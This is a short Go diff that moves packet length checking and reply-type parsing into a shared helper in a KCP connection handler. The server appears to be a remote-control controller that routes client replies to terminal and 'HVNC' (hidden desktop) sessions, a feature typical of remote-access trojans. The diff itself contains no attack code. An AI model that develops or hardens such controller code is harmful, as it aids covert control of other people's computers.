@@ -441,15 +441,12 @@ func HandleKCPConnectionForWithKeys(conn *kcp.UDPSession, listenerType string, m
 				logx.Infof("🔓 [KCP] 使用高级会话密钥解密: %s\n", uid)
 			}
 
-			// 【关键修复】检查数据长度，防止slice越界导致panic
-			if len(dataBytes) < 4 {
-				logx.Errorf("❌ [KCP] 解密后数据长度不足: %d < 4, UID: %s\n", len(dataBytes), uid)
+			// 拆包 + 边界校验统一走 SplitReplyPayload（B4 收敛，短载荷记日志跳过、不断连）
+			replyType, data, err := command.SplitReplyPayload(dataBytes)
+			if err != nil {
+				logx.Errorf("❌ [KCP] %v - UID: %s\n", err, uid)
 				continue
 			}
-
-			replyTypeBytes := dataBytes[:4]
-			data := dataBytes[4:]
-			replyType := binary.BigEndian.Uint32(replyTypeBytes)
 
 			// 客户端回包统一处理（TCP/KCP/WS 三协议共用，见 pkg/command/reply_handlers.go）
 			if err := command.HandleClientReply(listenerType, uid, replyType, data, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
